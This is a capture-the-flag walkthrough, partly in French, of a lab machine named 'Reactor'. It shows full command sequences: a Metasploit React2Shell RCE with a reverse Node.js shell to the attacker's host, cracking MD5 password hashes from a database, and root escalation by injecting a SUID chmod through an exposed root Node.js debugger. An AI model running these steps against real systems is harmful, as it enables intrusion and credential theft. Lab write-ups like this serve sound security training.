# Reactor

## Scan

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- 10.129.2.148   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-24 09:13 +0200
Nmap scan report for 10.129.2.148
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sun, 24 May 2026 07:13:41 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 24 May 2026 07:13:41 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
```

## Hosts

```shell
10.129.2.148 reactor.htb
```

## Dirbusting

nada
```shell
dirb http://reactor.htb:3000/                                                                        

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun May 24 09:16:50 2026
URL_BASE: http://reactor.htb:3000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://reactor.htb:3000/ ----
+ http://reactor.htb:3000/cgi-bin/ (CODE:308|SIZE:8)                                                                                                                                                                 
                                                                                                                                                                                                                     
-----------------
END_TIME: Sun May 24 09:18:51 2026
DOWNLOADED: 4612 - FOUND: 1
```

## Curl

info interressante
```shell
href="/_next/static/css/414e1be982bc8557.css" 
```
Utilisé par Next.js

## Searchsploit
```shell
searchsploit next.js   
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Next.js Middleware 15.2.2 -  Authorization Bypass                                                                                                                                   | multiple/webapps/52124.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
                      
```

## MSF

```shell
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf > search next.js

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/react2shell_unauth_rce_cve_2025_55182  2025-12-03       excellent  Yes    Unauthenticated RCE in React Server Components (React2Shell)
   1    \_ target: Next.js - Unix Command                       .                .          .      .
   2    \_ target: Next.js - Windows Command                    .                .          .      .
   3    \_ target: Waku - Unix Command                          .                .          .      .
   4    \_ target: Waku - Windows Command                       .                .          .      .



msf > use 0
[*] Using configured payload cmd/unix/reverse_nodejs
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > options

Module options (exploit/multi/http/react2shell_unauth_rce_cve_2025_55182):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to the React App
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_nodejs):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Next.js - Unix Command



View the full module info with the info, or info -d command.

msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set LHOST tun0
LHOST => 10.10.14.225
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RHOSTS 10.129.2.148
RHOSTS => 10.129.2.148
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > set RPORT 3000
RPORT => 3000
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Started reverse TCP handler on 10.10.14.225:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.14.225:4444 -> 10.129.2.148:53232) at 2026-05-24 09:28:16 +0200

whoami
node
pwd
/opt/reactor-app
ls -alh
total 76K
drwxr-xr-x  5 node node 4.0K Dec 28 21:05 .
drwxr-xr-x  4 root root 4.0K Apr 27 11:26 ..
drwxr-xr-x  2 node node 4.0K Dec 28 20:47 app
-rw-r--r--  1 node node  276 Dec 28 21:05 .env
drwxr-xr-x  7 node node 4.0K Dec 28 20:47 .next
-rw-r--r--  1 node node  172 Dec 28 20:47 next.config.js
drwxr-xr-x 30 node node 4.0K Dec 28 20:47 node_modules
-rw-r--r--  1 node node  269 Dec 28 20:47 package.json
-rw-r--r--  1 node node  29K Dec 28 20:47 package-lock.json
-rw-r-----  1 node node  12K Dec 28 21:03 reactor.db
```

### stabilisation du shell

```shell
which python
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
node@reactor:/opt/reactor-app$ 
```

### Users

```
id
uid=999(node) gid=988(node) groups=988(node)


cat /etc/passwd | grep -v nologin
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
pollinate:x:102:1::/var/cache/pollinate:/bin/false
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
_laurel:x:996:987::/var/log/laurel:/bin/false

```

### base sqlite

```shell
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
sqlite3 reactor.db
```
```sql
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
.tables
sensor_logs  users      
sqlite> SELECT * FROM users;
SELECT * FROM users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
sqlite> .quit
.quit
```

## John

```shell
┌──(kali㉿kali)-[~/reactor]
└─$ echo "admin:a203b22191d744a4e70ada5c101b17b8" > hashes.txt
echo "engineer:39d97110eafe2a9a68639812cd271e8e" >> hashes.txt
                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~/reactor]
└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
reactor1         (engineer)     
1g 0:00:00:00 DONE (2026-05-24 10:05) 2.000g/s 28686Kp/s 28686Kc/s 29360KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

## SSH

```shell
┌──(kali㉿kali)-[~/reactor]
└─$ ssh engineer@10.129.2.148
The authenticity of host '10.129.2.148 (10.129.2.148)' can't be established.
ED25519 key fingerprint is: SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.2.148' (ED25519) to the list of known hosts.
engineer@10.129.2.148's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Sun May 24 08:06:22 2026 from 10.10.14.225
engineer@reactor:~$ ls
user.txt
engineer@reactor:~$ cat user.txt 
ca5e9f24f3<SNIP>e67be55c9
```

### accès
```
user : engineer
pass : reactor1
```

## Linpeas

```shell
┌──(kali㉿kali)-[~/reactor]
└─$ scp /usr/share/peass/linpeas/linpeas.sh engineer@10.129.2.148:/tmp/linpeas.sh
engineer@10.129.2.148's password: 
linpeas.sh
```

```shell
engineer@reactor:~$ chmod +x /tmp/linpeas.sh
engineer@reactor:~$ /tmp/linpeas.sh

╔══════════╣ Checking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) (T1068)
╚ https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available
╚ https://www.cve.org/CVERecord?id=CVE-2026-43284
╚ https://www.cve.org/CVERecord?id=CVE-2026-43500
CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6
CVE-2026-43500 (rxrpc): autoloadable: rxrpc 
```

Alternativement, le système était vulnérable à Dirty Frag, mais j'ai privilégié l'exploitation de la mauvaise configuration du service uptime-monitor pour une approche plus stable

## netstat

```shell
engineer@reactor:~$ ps faux | grep 9229
root        1392  0.0  1.2 1066748 47640 ?       Ssl  03:10   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

## l'accès root

### L'Exploitation du Node.js Debugger (V8 Inspector)
La **vulnérabilité** : Une porte dérobée involontaire

Par défaut, Node.js peut être lancé avec un mode d'inspection (--inspect). Ce mode permet aux développeurs de connecter des outils (comme Chrome DevTools) pour voir ce qui se passe à l'intérieur du code

Ici, le problème venait de la configuration du processus :
```shell
root 1392 ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```
**L'erreur** : Le processus tournait en tant que root.
**Le port** : Le debugger écoutait sur le port 9229.
**La restriction** : Il n'écoutait que sur 127.0.0.1 (localhost), donc il n'était pas visible depuis l'extérieur lors de ton scan Nmap initial.


### Ajouter un SUID sur bash via le debugger
```shell
engineer@reactor:~$ ls -alh /bin/bash
-rwxr-xr-x 1 root root 1.4M Mar 31  2024 /bin/bash
```
#### Connexion au debugger et injection du payload
```shell
engineer@reactor:~$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('chmod +s /bin/bash')")
Uint8Array(0)
debug> 
```
```shell
engineer@reactor:~$ ls -alh /bin/bash
-rwsr-sr-x 1 root root 1.4M Mar 31  2024 /bin/bash
```
`-rwsr-sr-x`


| **Élément**                     | **Rôle technique**                                                                                                                 |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| **`exec("...")`**               | Fonction du debugger pour injecter et exécuter du code JS dans le processus cible.                                                 |
| **`process.mainModule`**        | Accède au contexte global de l'application pour contourner les restrictions de portée du debugger.                                 |
| **`.require('child_process')`** | Charge le module Node.js permettant l'interaction avec le système d'exploitation (OS).                                             |
| **`.execSync('...')`**          | Exécute une commande système avec les privilèges du processus (ici **root**).                                 |
| **`chmod +s /bin/bash`**        | **Payload :** Ajoute le bit **SUID** sur Bash, permettant à tout utilisateur de l'exécuter avec les droits du propriétaire (root) en faisant du `bash -p`. |


### Élévation de privilèges
#### Bash -p
Le flag `-p` signifie "Privileged mode". Il donne deux instructions spécifiques à Bash :

Ne pas abandonner les privilèges : Il ordonne au shell de conserver l'EUID (root) tel quel.
Ignorer l'environnement utilisateur : Il ignore tes fichiers de config personnels (comme .bashrc) pour éviter que des variables d'environnement malveillantes ne compromettent le shell root.


|**Commande**|**Ce qui se passe**|**Résultat**|
|---|---|---|
|`/bin/bash`|Bash voit le bit SUID, mais par sécurité, il "repasse" en mode utilisateur simple.|**Toujours engineer**|
|`/bin/bash -p`|Bash voit le bit SUID et l'argument `-p` lui dit d'accepter de rester root.|**ROOT**|


```shell
engineer@reactor:~$ /bin/bash -p
bash-5.2# id
uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd),1000(engineer)
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls -al
total 44
drwx------  7 root root 4096 May 24 03:10 .
drwxr-xr-x 23 root root 4096 May 20 10:07 ..
-rw-------  1 root root    0 May 20 10:12 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  2 root root 4096 May 20 09:10 .cache
drwxr-xr-x  3 root root 4096 Dec 28 20:47 .config
-rw-------  1 root root   20 May 18 13:10 .lesshst
drwxr-xr-x  3 root root 4096 Dec 28 20:54 .local
drwxr-xr-x  4 root root 4096 Dec 28 20:37 .npm
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-r-----  1 root root   33 May 24 03:10 root.txt
drwx------  2 root root 4096 Dec 28 20:30 .ssh
bash-5.2# cat root.txt 
5ad2ecf586<SNIP>4ba89e6e
```

